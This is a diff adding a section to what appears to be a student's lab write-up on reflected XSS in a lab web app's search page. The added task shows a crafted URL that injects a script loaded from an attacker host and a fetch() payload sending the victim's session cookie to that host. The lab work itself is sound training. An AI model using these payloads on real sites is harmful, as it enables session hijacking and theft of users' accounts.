@@ -168,3 +168,28 @@ Once the malicious script runs in the victim’s browser, it can:
         - we can see it in the url, so it is url encoded in a key-value format.
     4. In addition, think about the website’s authentication mechanisms and how they relate to this webpage. Why does this makes this page particularly interesting to us, especially in regards to the attacks built in the following tasks?
         - The search.php page is particularly interesting because it's publicly accessible (does not require login), but still executes within the context of an authenticated user session if the victim is logged in. This makes it a perfect attack surface for reflected XSS, as malicious scripts injected through it can access the victim's cookies or CSRF tokens, enabling session hijacking and further attacks in later tasks.
+    
+### Task4: Using the Reflected XSS Vector to Hijack User Sessions
+* One of the major threats of reflected XSS vulnerabilities is that they allow an attacker to steal
+credentials of a logged in user, i.e., to hijack user’s sessions. In particular, because input to the
+vulnerable search field can be given through a URL parameter, it is possible to craft a malicious
+URL of the form http://10.30.0.90/webpage?q=malicous-code , which leads
+to the reflected XSS vulnerability being exploited as soon as the user clicks a link.
+
+* so on excuting this command: 
+    > http://web-lab/search.php?q=<script src="http://10.30.0.1:9000/exploit.js"></script>
+- we can see that I got the PHPSESSID as shown in the screenshot: 
+    - ![alt text](image-9.png)
+- notice that if we were not logged in, the cookie parameter will be empty.
+
+- below is the payload we used to perform the task.
+    ```js
+        // Task 4 - Steal session cookie payload
+        fetch("http://10.30.0.1:9000?cookie=" + document.cookie);
+        
+        // 10.30.0.1 -> attacker ip
+        // 9000 -> port
+        // document.cookie -> the victim cookie
+
+        // then we send the GET request to the attacker with the victim cookie. 
+    ```
